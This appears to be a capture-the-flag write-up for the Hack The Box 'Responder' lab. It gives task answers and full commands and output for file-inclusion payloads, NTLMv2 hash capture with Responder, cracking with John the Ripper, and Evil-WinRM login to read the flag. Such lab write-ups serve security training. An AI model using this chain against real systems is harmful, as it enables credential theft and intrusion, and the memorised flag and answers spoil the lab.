# Responder
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Responder
* Topic: SMB, Responder, john, evil-winrm
* Difficulty: Very easy
* Date: 13-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. How many TCP ports are open on the machine?
 - **3**
2. When visiting the web service using the IP address, what is the domain that we are being redirected to? 
- **unika.htb**
3. Which scripting language is being used on the server to generate webpages?
- **PHP**
4. What is the name of the URL parameter which is used to load different language versions of the webpage? 
- **page**
5. Which of the following values for the 'page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
- **../../../../../../../../windows/system32/drivers/etc/hosts**
6. Which of the following values for the 'page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" 
- **//10.10.14.6/somefile**
7. What does NTLM stand for? 
- **New Technology LAN Manager**
8. Which flag do we use in the Responder utility to specify the network interface? 
- **-I**
9. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. 
- **john the ripper**
10. What is the password for the administrator user? 
 - **badminton**
 11. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 
  - **5985**

---
## Flag:
Nmap:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -p- -sC -sV 10.129.13.133 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 04:39 EDT
Nmap scan report for 10.129.13.133
Host is up (0.068s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 237.09 seconds
```

A web portal, let's have a look.

`http://10.129.13.133`

![](./attachments/Pasted%20image%2020220413115527.png)

We get redirected to `unika.htb`, but Firefox can't find the page. This is likely because 'name-based virtual hosting' is used to host multiple domains on one server. To access the site, we need to provide the server with both IP and Domain. We have both, so we just need to make Firefox make the connection.

In order to do that, we need to make an entry into our local DNS file located at `/etc/hosts`. This can be done with a simple command.

BASH: `echo "10.129.13.133 unika.htb" | sudo tee -a /etc/hosts`  

`echo`: Print this "x".  

`|`: Take the output from cmd 1 and give it to cmd 2.  

`tee`: Duplicate the output. Print one output in the console and in this case, append the other.  

`-a`: Append the input into file.

```console
┌──(kali㉿kali)-[~]
└─$ echo "10.129.13.133 unika.htb" | sudo tee -a /etc/hosts
```

Or use 'gedit' to edit the file.

```console
┌──(kali㉿kali)-[~]
└─$ sudo gedit /etc/hosts &
```

We can try to reach the site again.

![](./attachments/Pasted%20image%2020220413121213.png)

Great, now we have access. The page is a generic single page business front, except for the language switcher. 

![](./attachments/Pasted%20image%2020220413132921.png)

This might be vulnerable to file inclusion.

![](./attachments/Pasted%20image%2020220413133157.png)

It is. We can access the local DNS file of the server.

Since this is a window computer, we can trick it into initializing the SMB protocol by providing it with a random path to our local machine. During the initial SMB key exchange, we will be able to grab the NetNTLMv (hash) corresponding to a privileged account. We can utilize a tool called 'Responder' to set up an SMB server and grab what we need.

Initiating SMB connection from the host by injecting payload.

![](./attachments/Pasted%20image%2020220413140044.png)

Responder recieves the request.

```console
┌──(kali㉿kali)-[~/Downloads/Responder]
└─$ sudo python3 Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

(...)

[+] Listening for events...                                                                                              

[SMB] NTLMv2-SSP Client   : ::ffff:10.129.13.133
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:0be9c5c6cf0e9a1f:315A0FA65B9B10A52D30154FF9
B30B03:010100000000000080AF8BA6064FD80155B6827C008240070000000002000800590049005500340001001E005
70049004E002D00320036004C004A00540035004400340055003700310004003400570049004E002D00320036004C004
A0054003500440034005500370031002E0059004900550034002E004C004F00430041004C00030014005900490055003
4002E004C004F00430041004C000500140059004900550034002E004C004F00430041004C000700080080AF8BA6064FD
8010600040002000000080030003000000000000000010000000020000082174BADF21708E22DEA49E1A9D4B9082DB16
9627E622A1FBE7ADAC17D264F0A0A001000000000000000000000000000000000000900200063006900660073002F003
10030002E00310030002E00310034002E00310035000000000000000000
```

Now that we have the hash, we can use 'John the Ripper' to brute force the password using a [wordlist](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).

Command:

`sudo john --format=netntlmv2 -w=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt hash.txt`

`--format`: Use netntlmv2 format.

`-w=`: Use this wordlist.

```console
┌──(kali㉿kali)-[~/Downloads/Responder]
└─$ sudo john --format=netntlmv2 -w=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-04-13 09:10) 16.66g/s 546133p/s 546133c/s 546133C/s bulova..160582
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

*Hint: to clear john cache run `rm ~/.john/john.pot`*

We cracked the password. Now we just need to utilize it, since Linux doesn't support PowerShell out of the box, we'll use 'Evil-WinRM' to connect to the server.

Command:

`evil-winrm -i 10.129.156.117 -u administrator -p badminton`

`-i`: Host we want to connect to.

`-u`: User we want to log in as.

`-p`: Password of that user.

```console
┌──(kali㉿kali)-[~/Downloads/Responder]
└─$ evil-winrm -i 10.129.156.117 -u administrator -p badminton

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                 
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public

*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> ls

    Directory: C:\Users\mike

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop

*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> ls

    Directory: C:\Users\mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```

And we got the flag!

**Flag:** `ea81b7afddd03efaa0945333ed147fac`

---
**Tags:** [[Hack The Box]]